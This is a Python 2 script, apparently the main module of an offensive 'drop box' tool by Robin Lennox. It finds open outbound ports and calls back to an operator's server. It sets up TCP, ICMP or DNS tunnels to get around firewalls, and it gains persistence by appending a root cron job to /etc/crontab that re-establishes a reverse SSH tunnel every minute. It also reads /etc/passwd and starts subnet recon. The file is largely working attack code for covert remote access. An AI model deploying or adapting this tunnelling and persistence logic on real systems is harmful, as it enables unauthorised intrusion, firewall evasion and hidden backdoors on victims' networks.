#!/usr/bin/env python
# By Robin Lennox - twitter.com/robberbear

import argparse
import shutil
import sys
import time

from lib.layout import *
from lib.CheckInternet import *
import plugin.PortCheck
from plugin.PortCheck import *
from plugin.ProtocolCheck import *
from plugin.CallBack import *
from lib.InstallTools import *

#Import Colour Scheme
G,Y,B,R,W = colour()

def check_tools(verbose):
    return gitICMPTunnel(verbose)

def replaceText(filename,origText,replaceText,):
    s = open(filename).read()
    s = s.replace(str(origText), str(replaceText))
    f = open(filename, 'w')
    f.write(s)
    f.close()

def parser_error(errmsg):
    banner()
    print "Usage: python "+sys.argv[0]+" [Options] use -h for help"
    print R+"[x] Error: "+errmsg+W
    sys.exit()

def parse_args():
    #parse the arguments
    parser = argparse.ArgumentParser(epilog = '\tExample: \r\nsudo python '+sys.argv[0]+" -c 1.2.3.4")
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-a', '--aggressive', help='Aggressive scan, all',nargs='?', default=False)
    parser.add_argument('-c', '--callback', help='Enable call back to server',nargs='?', default='')
    parser.add_argument('-n', '--nameserver', help='Provide Nameserver for DNS callback',nargs='?', default='')
    parser.add_argument('-p', '--password', help='Password used for DNS callback',nargs='?', default='')
    parser.add_argument('-r', '--recon', help='Enable the recon module',nargs='?', default=False)
    parser.add_argument('-t', '--tunnel', help='Enable auto tunneling',nargs='?', default=False)
    parser.add_argument('-v', '--verbose', help='Enable Verbosity and display results in realtime',nargs='?', default=False)
    return parser.parse_args()

def args_check():
    args = parse_args()

    global callbackIP
    callbackIP = args.callback
    if callbackIP is None:
        print R+"[x] Error an IP address must be entered for callback to work"+W
        sys.exit(0)

    global nameserver
    nameserver = args.nameserver
    if nameserver is None:
        print R+"[x] Error an nameserver must be entered for DNS callback to work"+W
        sys.exit(0)

    global dnsPassword
    dnsPassword = args.password

    if dnsPassword and nameserver is '':
        print R+"[x] Error an nameserver must be entered for DNS callback to work"+W
        sys.exit(0)

    tunnel = args.tunnel
    sshuser = ''
    if tunnel or tunnel is None:
        passwd=open('/etc/passwd').read()
        if 'sshuser' in passwd:
            tunnel = True
            for line in passwd.splitlines():
                    if "sshuser" in line:
                        sshuser=line.split(':')[0]
                        print sshuser
        else:
            print R+"[x] Error: No sshuser!"+W
            print R+"[x] This needs to be setup for the auto tunnel to work"+W
            sys.exit(0)

    #Check Verbosity
    global verbose
    verbose = args.verbose
    if verbose or verbose is None:
        verbose = True

    #Check Recon
    global recon
    recon = args.recon
    if recon or recon is None:
        recon = True

    #Check Verbosity
    global aggressive
    aggressive = args.aggressive
    if aggressive or aggressive is None:
        aggressive = True

    return aggressive,callbackIP,dnsPassword,nameserver,recon,sshuser,tunnel,verbose

def check_ports():
    global callbackPort
    callbackPort = []

    print B+"\n[-] Running test for commonly open ports."+W
    if verbose:
        print Y+"[*] Checking for open ports using portquiz.net"+W
    check_port(portquiz_scan,aggressive,verbose,)

    # Portquiz might be blocked so try traceroute
    if not plugin.PortCheck.openPorts:
        if verbose:
            print R+"[*] portquiz.net returned no open ports"+W
            print B+"\n[-] Running test for commonly open ports."+W
            print Y+"[*] Checking for open ports using traceroute"+W
        check_port(traceroute_port_check,aggressive,verbose,)

    if openPorts:
        callbackPort = int(', '.join(plugin.PortCheck.openPorts))
        print G+"[+] Found open port/s: %s" % (callbackPort)+W
    else:
        print R+"[x] No open port found."+W

    if plugin.PortCheck.possiblePorts:
        print Y+"[+] Possible open port/s: %s" % (', '.join(plugin.PortCheck.possiblePorts))+W

def successMessage(ipAddr,port):
    print W+"------------------------------"+W
    print W+"[!] Port forward using: ssh -f -N -D 8123 root@%s -p%s" % (ipAddr,port,)+W
    print W+"[!] Check it's working using: curl --proxy socks5h://localhost:8123 http://google.com"+W
    print W+"------------------------------"+W

def callback():
    if callbackIP:
        count = 0
        stopCount = 100
        status = True
        
        # TCP Tunnel
        if callbackPort:
            if verbose:
                print Y+"\n[*] Calling back to IP %s on port %s" % (callbackIP,callbackPort,)+W
            while (count < stopCount):
                if plugin.CallBack.openPort(callbackPort,callbackIP):
                    count = stopCount
                    if plugin.CallBack.checkTunnel(callbackIP,callbackPort):
                        print G+"[+] SSH is Open"+W
                        successMessage(callbackIP,callbackPort)
                        return callbackIP,callbackPort
                        status = True
                    else:
                        print R+"\n[x] Port %s open on IP %s but unable to connect via SSH" %(callbackPort,callbackIP,)+W
                        status = False
                else:
                    if verbose:
                        print B+"[-] Waiting for port %s to be open on IP %s" %(callbackPort,callbackIP,)+W
                    count = count + 1

                    if count == stopCount:
                        print R+"\n[x] Port %s not open on IP %s after %s attempts" %(callbackPort,callbackIP,stopCount)+W
                        status = False
        else:
            print R+"\n[x] Can't attempt TCP Tunnel, no ports found open on IP %s\n" %(callbackIP,)+W
            status = False

        # ICMP Tunnel
        if status == False:
            print Y+"[*] Try a ICMP Tunnel."+W
            if check_icmp():
                if verbose:
                    print G+"[+] ICMP is enabled"+W
                if plugin.CallBack.icmpTunnel(callbackIP,verbose,):
                    if plugin.CallBack.checkTunnel('10.0.0.1',22):
                        print G+"[+] ICMP Tunnel Created!"+W
                        print B+"[-] An ICMP Tunnel is not as fast as a TCP Tunnel"+W
                        successMessage("10.0.0.1",22)
                        return "10.0.0.1",'22'
                        status = True
                    else:
                        print R+"[x] ICMP Enabled but unable to create ICMP Tunnel"+W
                        status = False
                else:
                    print R+"[x] ICMP Enabled but unable to create ICMP Tunnel"+W
                    status = False
            else:
                print R+"\n[x] Can't attempt ICMP Tunnel, ICMP is disabled\n"+W
                status = False

        # DNS Tunnel
        if status == False and dnsPassword:
            print Y+"[*] Try a DNS Tunnel."+W
            
            #if check_dns(): # Didn't work on open wifi need to check
            #if verbose:
            #    print G+"[+] DNS Queries are allowed"+W
            if dnsTunnel(dnsPassword,nameserver,verbose,):
                successMessage('192.168.128.1',22)
                return '192.168.128.1','22'
                status = True
            else:
                print R+"\n[x] Can't attempt DNS Tunnel, DNS is disabled or DNS blocked on the server %s \n" %(nameserver,)+W
                print R+"\n[x] Try connecting to there Name Server %s \n" %(nameserver,)+W
                status = False

def startRecon():
    print Y+"\n[*] Running Recon on SMB."+W
    localIP = getIP()
    subnetIP = "%s.0" %('.'.join(localIP.split('.')[:-1]))
    print G+"[+] The IP address is %s" % (localIP)
    print G+"[+] The IP subnet is %s/24" % (subnetIP)

def main():
    aggressive,callbackIP,dnsPassword,nameserver,recon,sshuser,tunnel,verbose = args_check()
    banner()
    if not os.geteuid() == 0:
        sys.exit(R+'[!] Script must be run as root\n'+W)

    if verbose:
        print B+"[-] Verbosity is enabled"+W

    #Need to check if binary in
    checkTools(verbose)

    if aggressive:
        print B+"[-] Aggressive is enabled"+W

    if tunnel:
        print B+"[-] Auto Tunnel is enabled"+W

    callbackPort=22
    tunnelIP=callbackIP
    tunnelPort=callbackPort
    if openPort(callbackPort,callbackIP) and checkTunnel(callbackIP,callbackPort):
        # Quick check for 22
        successMessage(callbackIP,callbackPort)
    else:
        check_ports()

        # Try incase the nothing returned as there is no possible tunnel
        try:
            tunnelIP,tunnelPort=callback()
        except:
            print R+'[!] Tunnel not possible, as no posible tunnels to the callback server could be found\n'+W
            tunnel = False
            pass

    if tunnel:
        print G+"[+] Setting up remote tunnel back to this device"+W
        PWD=os.path.dirname(os.path.realpath(__file__))
        checkSSHLOC=PWD+'/lib/checkSSH.sh'
        shutil.copy(PWD+'/lib/checkSSH.bak', checkSSHLOC)
        replaceText(checkSSHLOC,'SET_IP',tunnelIP)
        replaceText(checkSSHLOC,'SET_PORT',tunnelPort)
        replaceText(checkSSHLOC,'SET_USER',sshuser)
        if checkSSHLOC not in open('/etc/crontab').read():
            with open('/etc/crontab', "a") as file:
                print G+"[+] Added SSH to try every minute in /etc/crontab"+W
                file.write("*/1 * * * * root bash %s > /dev/null 2>&1 \n" %(checkSSHLOC))
    
    if recon:
        startRecon()

if __name__ == "__main__":
    main()
